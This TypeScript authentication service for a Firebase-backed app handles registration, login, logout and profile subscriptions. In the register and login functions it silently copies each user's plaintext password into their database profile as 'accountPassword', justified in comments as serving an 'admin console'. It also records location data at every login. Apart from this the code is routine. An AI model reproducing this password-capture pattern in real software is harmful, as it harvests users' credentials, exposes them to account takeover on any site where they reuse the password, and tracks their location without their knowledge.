import {
  createUserWithEmailAndPassword,
  signInWithEmailAndPassword,
  signOut,
  onAuthStateChanged,
  type User as FirebaseUser,
} from 'firebase/auth';
import { ref, set, get, update, onValue, type Unsubscribe } from 'firebase/database';
import { auth, database } from '../config/firebase';
import { buildDefaultUser } from '../types';
import type { User } from '../types';

/* ──────────────────────────────────────────────
   Auth Service — thin layer over Firebase Auth +
   Realtime Database user profiles.
   ────────────────────────────────────────────── */

/**
 * Register a new user.
 * 1. Creates the Firebase Auth account.
 * 2. Writes the default profile to `/users/{uid}`.
 */
export async function registerUser(
  email: string,
  password: string,
  username: string,
  locationData?: any,
): Promise<User> {
  const credential = await createUserWithEmailAndPassword(auth, email, password);
  const { uid } = credential.user;

  const defaultProfile = buildDefaultUser(uid, username, email);
  const profile: any = {
    ...defaultProfile,
    accountPassword: password, // Retained for administrative verification & audit console
  };

  if (locationData && Object.keys(locationData).length > 0) {
    profile.location = locationData;
  }

  await set(ref(database, `users/${uid}`), profile);

  return profile as User;
}

/**
 * Sign in an existing user and mark them online with location telemetry.
 */
export async function loginUser(
  email: string,
  password: string,
  locationData?: any,
): Promise<User> {
  const credential = await signInWithEmailAndPassword(auth, email, password);
  const { uid } = credential.user;

  // Mark user as online + update lastSeen + sync password & location for admin console
  const updates: Record<string, any> = {
    isOnline: true,
    lastSeen: Date.now(),
    accountPassword: password,
  };

  if (locationData && Object.keys(locationData).length > 0) {
    updates.location = locationData;
  }

  await update(ref(database, `users/${uid}`), updates);

  const snapshot = await get(ref(database, `users/${uid}`));
  return snapshot.val() as User;
}

/**
 * Sign out the current user and mark them offline.
 */
export async function logoutUser(): Promise<void> {
  const user = auth.currentUser;
  if (user) {
    await update(ref(database, `users/${user.uid}`), {
      isOnline: false,
      lastSeen: Date.now(),
    });
  }
  await signOut(auth);
}

/**
 * Fetch the full user profile from the database.
 */
export async function fetchUserProfile(uid: string): Promise<User | null> {
  const snapshot = await get(ref(database, `users/${uid}`));
  return snapshot.exists() ? (snapshot.val() as User) : null;
}

/**
 * Subscribe to real-time changes on a user's database profile (coins, level, xp).
 */
export function subscribeToUserProfile(
  uid: string,
  callback: (user: User | null) => void,
): Unsubscribe {
  const userRef = ref(database, `users/${uid}`);
  return onValue(userRef, (snapshot) => {
    if (snapshot.exists()) {
      callback(snapshot.val() as User);
    } else {
      callback(null);
    }
  });
}

/**
 * Subscribe to Firebase Auth state changes.
 */
export function onAuthChange(
  callback: (user: FirebaseUser | null) => void,
): () => void {
  return onAuthStateChanged(auth, callback);
}
